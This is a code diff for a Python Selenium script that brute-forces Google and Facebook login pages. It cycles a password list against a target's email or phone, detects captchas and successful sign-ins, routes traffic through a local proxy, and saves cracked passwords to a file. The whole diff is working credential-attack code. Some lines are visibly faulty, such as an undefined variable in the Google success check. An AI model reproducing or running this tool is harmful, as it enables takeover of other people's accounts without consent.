@@ -50,16 +50,6 @@ else:
     print(f'{blue}New setting configured... Kindly restart the program{plain}')
     sys.exit()
     
-def sanitize_json_str(value):
-  if value:
-    return value.replace(",", "").strip()
-
-def sanitize_json_bool(value):
-  if value != "":
-    if "true" in value:
-      return True
-    return False
-       
 def proxy_status():
   with open('data/settings.json', 'r') as settings:
     setting = settings.readlines()
@@ -276,7 +266,7 @@ def main():
     command = command.strip()
     if command.lower() in ['brute', 'brute-force']:
       if set_json["proxy"]:
-        temp_disable = input(f'{blue}Temporarily disable proxy for now [Yes | No] : {plain}').lower()
+        temp_disable = input(f'{blue}𝚃𝚎𝚖𝚙𝚘𝚛𝚊𝚛𝚒𝚕𝚢 𝚍𝚒𝚜𝚊𝚋𝚕𝚎 𝚙𝚛𝚘𝚡𝚢 𝚏𝚘𝚛 𝚗𝚘𝚠 [𝚈𝚎𝚜 | 𝙽𝚘] : {plain}').lower()
         disable_now = True if temp_disable.strip() == "yes" else False
       br = True
       while br:
@@ -304,105 +294,110 @@ def main():
             sign_in_tar = 'http://127.0.0.1:8000/accounts.google.com/v3/signin/identifier?dsh=S1812573153%3A1655944654029516&flowEntry=ServiceLogin&flowName=WebLiteSignIn&ifkv=AX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5'
           
           sign_in_tar = 'https://accounts.google.com/v3/signin/identifier?dsh=S1812573153%3A1655944654029516&flowEntry=ServiceLogin&flowName=WebLiteSignIn&ifkv=AX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5'
-          try:
-            driver = webdriver.Chrome(options = options)
-            driver.get(sign_in_tar)
-            time.sleep(5)
+          
+          email_or_phone = input(f'{yellow}𝙴𝚖𝚊𝚒𝚕 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 >>> {plain}')
+          if email_or_phone.lower() in ['exit']:
+            break 
+          read_mem = memory(email_or_phone,1,None,onload_file())
+          index_h = read_mem.read_()
+          i = index_h if index_h != None else 0
+          pass_ = run_brute()
+          while i < len(pass_):
+            check_password = pass_[i]
+            try:
+              driver = webdriver.Chrome(options = options)
+              driver.get(sign_in_tar)
+              time.sleep(5)
 
-            wait = WebDriverWait(driver, 20)
-            page_source = driver.page_source
-            page_ = bs(page_source, 'html.parser')
-            if 'Error' in page_.text:
-              print(page_)
+              wait = WebDriverWait(driver, 20)
+              page_source = driver.page_source
+              page_ = bs(page_source, 'html.parser')
+              if 'Error' in page_.text:
+                print(page_)
               
-            if page_.find_all('form'):
-              email_or_phone = input(f'{yellow}𝙴𝚖𝚊𝚒𝚕 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 >>> {plain}')
-              if email_or_phone.lower() in ['exit']:
-                break
-              
+              print(f'{green}𝚃𝚛𝚢𝚒𝚗𝚐 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 : {check_password}{plain}')
               target_email = driver.find_element(By.CSS_SELECTOR, 'input[name="identifier"]')
               
               target_email.send_keys(email_or_phone)
               wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
               driver.find_element(By.XPATH,'//button[contains(text(), "Next")]').click()
               captcha = []
-            read_mem = memory(email_or_phone,1,None,onload_file())
-            index_h = read_mem.read_()
-            i = index_h if index_h != None else 0
-            pass_ = run_brute()
-            while i < len(pass_):
-              check_password = pass_[i]
-              try:
-                wait.until(EC.visibility_of_element_located((By.XPATH, '//input[@type="password"]')))
-                target_password = driver.find_element(By .XPATH,'//input[@type="password"]')
-                target_password.clear()
-                target_password.send_keys(check_password)
-                wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
-                driver.find_element(By.XPATH,'//button[contains(text(), "Next")]').click()
-                wait.until(EC.visibility_of_element_located((By.XPATH, '//span[contains(text(), "Wrong password")]')))
+              wait.until(EC.visibility_of_element_located((By.XPATH, '//input[@type="password"]')))
+              target_password = driver.find_element(By .XPATH,'//input[@type="password"]')
                 
-                print(f'{red}Incorrect password : {check_password} {plain}')
-                save_mem = memory(email_or_phone,1,check_password,onload_file())
-                save_mem.update_()
-              except selenium.common.exceptions.TimeoutException:
+              target_password.send_keys(check_password)
+              wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
+              driver.find_element(By.XPATH,'//button[contains(text(), "Next")]').click()
+              wait.until(EC.visibility_of_element_located((By.XPATH, '//span[contains(text(), "Wrong password")]')))
                 
-                page_ = bs(driver.page_source, 'html.parser').text
+              print(f'{red}𝙸𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 {plain}', flush = True)
+              save_mem = memory(email_or_phone,1,check_password,onload_file())
+              save_mem.update_()
+              driver.quit()
+            except selenium.common.exceptions.TimeoutException:
+                
+              page_ = bs(driver.page_source, 'html.parser').text
                
-                if r"Couldn’t find your Google Account" in page_:
-                  print(f'{red}Couldn\'t find the google account {email_or_phone}{plain}')
-                  driver.quit()
-                  break
-                elif r"Enter a valid email or phone number" in page_:
-                  print(f'{red}Enter a valid email or phone number{plain}')
-                  driver.quit()
-                  break
+              if r"Couldn’t find your Google Account" in page_:
+                print(f'{red}Couldn\'t find the google account {email_or_phone}{plain}')
+                driver.quit()
+                break
+              elif r"Enter a valid email or phone number" in page_:
+                print(f'{red}Enter a valid email or phone number{plain}')
+                driver.quit()
+                break
                   
-                elif "Confirm that you’re not a robot" in page_:
-                  captcha.extend(check_password)
-                  print(f'{red}Captcha detected {plain}')
-                  if len(captcha) > 5:
-                    print(f'{red}The server keeps calling me a bot, i should just go to sleep now💤...You should too{plain}')
-                    driver.quit()
-                    break
-  
-                elif r"You're signed in" in response_ or   r"Recovery information" in response_ or r'2-step verification' in response_:
-                  print(f'{green}Correct password : {check_password}{plain}')
+              elif "Confirm that you’re not a robot" in page_:
+                captcha.extend(check_password)
+                print(f'{red}Captcha detected {plain}')
+                if len(captcha) > 5:
+                  print(f'{red}The server keeps calling me a bot, i should just go to sleep now💤...You should too{plain}')
                   driver.quit()
-                  save_passwords.write(f'{username_email} - {check_password} - Google - {time.time()}\n')
-                  del_mem = memory(email_or_phone,1,None,None)
-                  del_mem.terminate_()
                   break
-                else:
-                  pass
-              i += 1
-            del_mem = memory(email_or_phone,1,None,None)
-            del_mem.terminate_()
+  
+              elif r"You're signed in" in response_ or   r"Recovery information" in response_ or r'2-step verification' in response_:
+                print(f'{green}Correct password : {check_password}{plain}')
+                driver.quit()
+                save_passwords.write(f'{username_email} - {check_password} - Google - {time.time()}\n')
+                del_mem = memory(email_or_phone,1,None,None)
+                del_mem.terminate_()
+                break
+              else:
+                pass
+           
               
-          except Exception:
-            track = traceback.format_exc()
-            proxy_errorV(errorLogged = track, terminate = caught_proxy)
+            except Exception:
+              track = traceback.format_exc()
+              proxy_errorV(errorLogged = track, terminate = caught_proxy)
+              driver.quit()
+            
             driver.quit()
-          
+            i += 1
+            
+          del_mem = memory(email_or_phone,1,None,None)
+          del_mem.terminate_()
+            
+           
         if tar in ['facebook','2']:
           username_email = input(f'{yellow}[𝙴𝚖𝚊𝚒𝚕 𝚊𝚍𝚍𝚛𝚎𝚜𝚜 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛] >>> {plain}')
           if username_email.lower() in ['exit']:
             break
-          
+          caught_proxy = onload_proxy()
+          if caught_proxy != None and disable_now == False:
+            options.add_argument('--proxy-server=127.0.0.1:8000')
+            options.add_argument('ignore-certificate-errors')
+            sign_in_face = 'http://127.0.0.1:8000/https://m.facebook.com/?rcs=ATA8kUHTRamaHaCJtN302QdoJ--JpWwH6lhmnM2RoDZg4Qhlcjh4PXiAKViPL4Cqs4ny1uovx6g5QLOJbR6VAF7SXHQXmUb_b57xLaow_r7XeSdpxp9z8mwJ5ULrsncUrrFS7HRi4wYpaaEfoY-ekIzQ2y-mhoIxIN8FnA'
+            
+            
+          sign_in_face = 'https://m.facebook.com/?rcs=ATA8kUHTRamaHaCJtN302QdoJ--JpWwH6lhmnM2RoDZg4Qhlcjh4PXiAKViPL4Cqs4ny1uovx6g5QLOJbR6VAF7SXHQXmUb_b57xLaow_r7XeSdpxp9z8mwJ5ULrsncUrrFS7HRi4wYpaaEfoY-ekIzQ2y-mhoIxIN8FnA'
           read_mem = memory(username_email,2,None,onload_file())
           index_h = read_mem.read_()
           i = index_h if index_h != None else 0
           pass_ = run_brute()
           while i < len(pass_):
             check_password = pass_[i]
-            caught_proxy = onload_proxy()
-            if caught_proxy != None and disable_now == False:
-              options.add_argument('--proxy-server=127.0.0.1:8000')
-              sign_in_face = 'http://127.0.0.1:8000/https://m.facebook.com/?rcs=ATA8kUHTRamaHaCJtN302QdoJ--JpWwH6lhmnM2RoDZg4Qhlcjh4PXiAKViPL4Cqs4ny1uovx6g5QLOJbR6VAF7SXHQXmUb_b57xLaow_r7XeSdpxp9z8mwJ5ULrsncUrrFS7HRi4wYpaaEfoY-ekIzQ2y-mhoIxIN8FnA'
-              options.add_argument('ignore-certificate-errors')
-            else:
-              sign_in_face = 'https://m.facebook.com/?rcs=ATA8kUHTRamaHaCJtN302QdoJ--JpWwH6lhmnM2RoDZg4Qhlcjh4PXiAKViPL4Cqs4ny1uovx6g5QLOJbR6VAF7SXHQXmUb_b57xLaow_r7XeSdpxp9z8mwJ5ULrsncUrrFS7HRi4wYpaaEfoY-ekIzQ2y-mhoIxIN8FnA'
-            driver = webdriver.Chrome(options = options)
             try:
+              driver = webdriver.Chrome(options = options)
               driver.get(sign_in_face)
               time.sleep(5)
               page_ = bs(driver.page_source, 'html.parser').text
@@ -481,6 +476,7 @@ def main():
             
             driver.quit()
             i += 1
+          
           del_mem = memory(username_email,2,None,None)
           del_mem.terminate_()
         
